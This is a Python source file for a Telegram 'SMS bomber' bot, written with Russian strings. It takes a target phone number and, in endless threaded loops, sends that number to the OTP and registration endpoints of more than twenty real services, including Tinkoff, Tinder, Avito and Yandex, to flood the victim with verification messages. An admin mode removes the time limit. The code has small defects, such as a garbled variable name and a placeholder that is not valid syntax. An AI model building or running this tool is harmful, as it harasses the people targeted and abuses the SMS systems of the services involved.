import requests
import threading
from datetime import datetime, timedelta
from telebot import TeleBot
import telebot
import time

TOKEN = 'токен вашего бота'

THREADS_LIMIT = 10000

chat_ids_file = 'chat_ids.txt'

ADMIN_CHAT_ID = (@userinfobot в помощь)

users_amount = [0]
threads = list()
THREADS_AMOUNT = [0]
types = telebot.types
bot = TeleBot(TOKEN)
running_spams_per_chat_id = []


def save_chat_id(chat_id):
	"Функция добавляет чат айди в файл если его там нету"
	chat_id = str(chat_id)
	with open(chat_ids_file,"a+") as ids_file:
		ids_file.seek(0)

		ids_list = [line.split('\n')[0] for line in ids_file]

		if chat_id not in ids_list:
			ids_file.write(f'{chat_id}\n')
			ids_list.append(chat_id)
			print(f'New chat_id saved: {chat_id}')
		else:
			print(f'chat_id {chat_id} is already saved')
		users_amount[0] = len(ids_list)
	return


def send_message_users(message):

	def send_message(chat_id):
		data = {
			'chat_id': chat_id,
			'text': message
		}
		response = requests.post(f'https://api.telegram.org/bot{TOKEN}/sendMessage', data=data)

	with open(chat_ids_file, "r") as ids_file:
		ids_list = [line.split('\n')[0] for line in ids_file]

	[send_message(chat_id) for chat_id in ids_list]


@bot.message_handler(commands=['start'])
def start(message):
	keyboard = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
	boom = types.KeyboardButton(text='Атака')
	stop = types.KeyboardButton(text='Стоп Спам')
	info = types.KeyboardButton(text='Информация')

	buttons_to_add = [boom, stop, info]

	if int(message.chat.id) == ADMIN_CHAT_ID:
		buttons_to_add.append(types.KeyboardButton(text='Рассылка'))

	keyboard.add(*buttons_to_add)
	bot.send_message(message.chat.id, 'Добро пожаловать🙋‍♂!\nЭто Бомбер канала @cyberland_x\nПеред использованием ответственность за ваши действия несете вы лично.\nВыберите действие:',  reply_markup=keyboard)
	save_chat_id(message.chat.id)

def start_spam(chat_id, phone_number, force):
	running_spams_per_chat_id.append(chat_id)

	if force:
		msg = f'!Спам запущен на неограниченое время для номера +{phone_number}!'
	else:
		 msg = f'!Спам запущен на 5 минут на номер +{phone_number}!'

	bot.send_message(chat_id, msg)
	end = datetime.now() + timedelta(minutes = 5)
	while (datetime.now() < end) or (force and chat_id==ADMIN_CHAT_ID):
		if chat_id not in running_spams_per_chat_id:
			break
		send_for_number(phone_number)
	bot.send_message(chat_id, f'!Спам на номер {phone_number} завершён!')
	THREADS_AMOUNT[0] -= 1 # стояло 1
	try:
		running_spams_per_cзнhat_id.remove(chat_id)
	except Exception:
		pass


def send_for_number(phone):
		request_timeout = 0.00001
		while True:
			requests.post('https://koronapay.com/transfers/online/api/users/otps',
			data = {"phone":phone},
			headers = {'Accept-Language':'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3', 'Connection':'keep-alive', 'Host':'koronapay.com', 'origin':'https://koronapay.com','Referer':'https://koronapay.com/transfers/online/login'})

			requests.post('https://rutube.ru/api/accounts/sendpass/phone?phone=%2B79195346628',
			data = {"phone":phone},
			headers = {'Accept-Language':'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3', 'Connection':'keep-alive', 'Host':'rutube.ru', 'origin':'https://rutube.ru','Referer':'https://rutube.ru/'})

			requests.post('https://api.ivi.ru/mobileapi/user/register/phone/v6/',
			data = {"phone":"7" + phone},
			headers = {'Accept-Language':'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3', 'Connection':'keep-alive', 'Host':'api.ivi.ru', 'origin':'https://www.ivi.ru/','Referer':'https://www.ivi.ru/profile'})

			requests.post('https://register.sipnet.ru/cgi-bin/exchange.dll/RegisterHelper?oper=9&phone=79821432646',
			data = {"phone":phone,"oper":"9"},
			headers = {'Accept-Language':'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3', 'Connection':'keep-alive', 'Host':'register.sipnet.ru', 'origin':'https://www.sipnet.ru/','Referer':'https://www.sipnet.ru/tarify-ip-telefonii'})

			requests.post('https://api.chef.yandex/api/v2/auth/sms',
			data = {"phone":phone},
			headers = {'Accept-Language':'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3', 'Connection':'keep-alive', 'Host':'api.chef.yandex', 'origin':'https://chef.yandex/','Referer':'https://chef.yandex/login'})
	
			requests.post('https://api.tinkoff.ru/v1/sign_up?origin=web%2Cib5%2Cplatform&sessionid=RznyziZkeagDbs6SLIr13ZlfSjusxJbQ.m1-prod-api26&wuid=31ad89052c4944fd8cd55bcf419eefc1',
			data = {"phone":phone},
			headers = {'Accept-Language':'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3', 'Connection':'keep-alive', 'Host':'api.tinkoff.ru', 'origin':'https://www.tinkoff.ru','Referer':'https://www.tinkoff.ru/login/'})
	
			requests.post('https://api.tinkoff.ru/v1/sign_up?origin=web%2Cib5%2Cplatform&sessionid=RznyziZkeagDbs6SLIr13ZlfSjusxJbQ.m1-prod-api26&wuid=31ad89052c4944fd8cd55bcf419eefc1',
			data = {"phone":phone},
			headers = {'Accept-Language':'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3', 'Connection':'keep-alive', 'Host':'api.tinkoff.ru', 'origin':'https://www.tinkoff.ru','Referer':'https://www.tinkoff.ru/login/'})
	
			requests.post('https://smart.space/api/users/request_confirmation_code/',
			data = {"action":"confirm_mobile","mobile":"a"},
			headers =  {'Accept-Language':'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3', 'Connection':'keep-alive', 'Host':'api.gotinder.com', 'origin':'https://tinder.com/?lang=ru','Referer':'https://tinder.com/?lang=ru'})
	
			requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
			data = {"phone_number":"7" + phone},
			headers = {'Accept-Language':'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3', 'Connection':'keep-alive', 'Host':'api.gotinder.com', 'origin':'https://tinder.com/?lang=ru','Referer':'https://tinder.com/?lang=ru'})
	
			requests.post('https://api-user.privetmir.ru/api/send-code',
			data = {"back_url":"/register/step-2/","scope":"register-user","login":phone,"checkExist":"Y","checkApproves":"Y","approve1":"on","approve2":"on"},
			headers = {'Accept-Language':'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3', 'Connection':'keep-alive', 'Host':'api-user.privetmir.ru', 'origin':'https://privetmir.ru/','Referer':'https://privetmir.ru/register/'})
	
			requests.post('https://online.sbis.ru/reg/service/?x_version=19.412.b-40',
			data = {"phone":phone},
			headers = {'Accept-Language':'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3', 'Connection':'keep-alive', 'Host':'online.sbis.ru', 'origin':'https://online.sbis.ru','Referer':'https://online.sbis.ru/auth/?ret=%2F&tab=register&regType=personal'})
	
			requests.post('https://api.sunlight.net/v3/customers/authorization/',
			data = {"phone":phone},
			headers = {'Accept-Language':'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3', 'Connection':'keep-alive', 'Host':'api.sunlight.net', 'origin':'https://sunlight.net/','Referer':'https://sunlight.net/profile/login/?next=/profile/'})
	
			requests.post('https://radugavkusaufa.ru/?action=auth&act=132',
			data = {"CSRF":"","ACTION":"REGISTER","MODE":"PHONE","PHONE":"7" + phone,"PASSWORD":"791911534661128","PASSWORD2":"791911534661128"},
			headers = {'Accept-Language':'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3', 'Connection':'keep-alive', 'Host':'radugavkusaufa.ru', 'origin':'https://radugavkusaufa.ru','Referer':'https://radugavkusaufa.ru/'})
	
			requests.post('https://beta.delivery-club.ru/api/user/otp',
			data = {"phone":phone},
			headers = {'Accept-Language':'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3', 'Connection':'keep-alive', 'Host':'beta.delivery-club.ru', 'origin':'https://beta.delivery-club.ru','Referer':'https://beta.delivery-club.ru/entities/food?authPopupOpened=1'})
	
			requests.post('https://api.ennergiia.com/auth/api/development/lor',
			data = {"phone":phone,"referrer":"ennergiia","via_sms":"true"},
			headers = {'Accept-Language':'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3', 'Connection':'keep-alive', 'Host':'api.ennergiia.com', 'origin':'https://www.ennergiia.com','Referer':'https://www.ennergiia.com/auth'})
	
			requests.post('https://youla.ru/web-api/auth/request_code',
			data = {"phone":"7" + phone},
			headers = {'Accept-Language':'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3', 'Connection':'keep-alive', 'Host':'youla.ru', 'origin':'https://youla.ru','Referer':'https://youla.ru/surgut'})
	
			requests.post('https://ostin.com/ru/ru/secured/myaccount/myclubcard/resultClubCard.jsp?type=sendConfirmCode&phoneNumber=%207%20(982)143-26-46',
			data = {"phoneNumer":"7" + phone},
			headers = {'Accept-Language':'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3', 'Connection':'keep-alive', 'Host':'ostin.com', 'origin':'https://ostin.com/','Referer':'https://ostin.com/'})
	
			requests.post('https://www.maxidom.ru/ajax/doRegister.php?RND=0.6416262061536506',
			data = {"REGISTER_PHIS[LOGIN]":"asaofjkiawhwjk@mail.ru","REGISTER_PHIS[PHONE]":"a","REGISTER_PHIS[PASSWORD]":"asaofjkiawhwjk@mail.ru","REGISTER_PHIS[RULES]":"Y"},
			headers = {'Accept-Language':'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3', 'Connection':'keep-alive', 'Host':'www.maxidom.ru', 'origin':'https://www.maxidom.ru/','Referer':'https://www.maxidom.ru/ajax/doRegister.php?RND=0.6416262061536506'})
	
			requests.post('https://api.mtstv.ru/v1/users',
			data = {"msisdn":phone},
			headers = {'Accept-Language':'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3', 'Connection':'keep-alive', 'Host':'api.mtstv.ru', 'origin':'https://www.mtstv.ru','Referer':'https://www.mtstv.ru/?popup=auth&tab=reg'})
	
			requests.post('https://app.karusel.ru/api/v1/phone/',
			data = {"phone":phone},
			headers = {'Accept-Language':'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3', 'Connection':'keep-alive', 'Host':'app.karusel.ru', 'origin':'https://karusel.ru','Referer':'https://karusel.ru/registration'})
	
			requests.post('https://client.taximaxim.com/site/send-code/?type=0',
			data = {"_csrf":"SuyaDpUnfWWvTkF8GytL1zAJqUUvLMc_SUXaEGhXsoQa2tJvwF8nC_YJEQpaHhKkVGCRIhljrggQJ4ljCW-G4Q==","LoginForm[org]":"maxim","LoginForm[country]":"ru","LoginForm[baseId]":"11","LoginForm[phone]":phone,"LoginForm[code]":"","LoginForm[agree]":"0"},
			headers = {'Accept-Language':'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3', 'Connection':'keep-alive', 'Host':'client.taximaxim.com', 'origin':'https://client.taximaxim.com','Referer':'https://client.taximaxim.com/login/'})
	
			requests.post('https://www.avito.ru/code/request',
			data = {"phone":phone},
			headers = {'Accept-Language':'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3', 'Connection':'keep-alive', 'Host':'avito.ru', 'origin':'https://www.avito.ru','Referer':'https://www.avito.ru/code/request#registration'})
	
			requests.post('https://b.utair.ru/api/v1/login/',
			data = {"phone":phone},
			headers = {'Accept-Language':'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3', 'Connection':'keep-alive', 'Host':'utair.ru', 'origin':'https://www.utair.ru','Referer':'https://b.utair.ru/api/v1/'})


def spam_handler(phone, chat_id, force):
	if int(chat_id) in running_spams_per_chat_id:
		bot.send_message(chat_id, '!Вы уже начали рассылку спама. Дождитесь окончания или нажмите Стоп Спам и поробуйте снова!')
		return

	if THREADS_AMOUNT[0] < THREADS_LIMIT:
		x = threading.Thread(target=start_spam, args=(chat_id, phone, force))
		threads.append(x)
		THREADS_AMOUNT[0] += 1
		x.start()
	else:
		bot.send_message(chat_id, '!Сервера сейчас перегружены. Попытайтесь снова через несколько минут!')
		print('Максимальное количество тредов исполняется. Действие отменено.!')


@bot.message_handler(content_types=['text'])
def handle_message_received(message):
	chat_id = int(message.chat.id)
	text = message.text

	if text == 'Информация':
		bot.send_message(chat_id, 'Создатель бота: @cyberladmin\nПо вопросам сотрудничества обращаться в ЛС к создателю бота\n\nРебята, кто может помочь на развитие нашего канала и бота\nЯНдекс.Деньги: 410017920364153 \n\n')

	elif text == 'Атака на номер':
		bot.send_message(chat_id, 'Введите номер без + в формате:\n🇺🇦 380xxxxxxxxx\n🇷🇺 79xxxxxxxxx\n🇰🇿 77xxxxxxxxx')

	elif text == 'Рассылка' and chat_id==ADMIN_CHAT_ID:
		bot.send_message(chat_id, 'Введите сообщение в формате: "отправка: ваш_текст" без кавычек')
	
	elif text == 'Стоп Спам':
		if chat_id not in running_spams_per_chat_id:
			bot.send_message(chat_id, 'Вы еще не начинали спам')
		else:
			running_spams_per_chat_id.remove(chat_id)

	elif 'отправка: ' in text and chat_id==ADMIN_CHAT_ID:
		msg = text.replace("отправка: ","")
		send_message_users(msg)

	elif len(text) == 11:
		phone = text
		spam_handler(phone, chat_id, force=False)

	elif len(text) == 12:
		phone = text
		spam_handler(phone, chat_id, force=False)

	elif len(text) == 12 and chat_id==ADMIN_CHAT_ID and text[0]=='_':
		phone = text[1:]
		spam_handler(phone, chat_id, force=True)

	else:
		bot.send_message(chat_id, f'Номер введен неправильно. Введено {len(text)} символов, ожидается 11')
		print(f'Номер введен неправильно. Введено {len(text)} символов, ожидается 11')

if __name__ == '__main__':
	bot.polling(none_stop=True)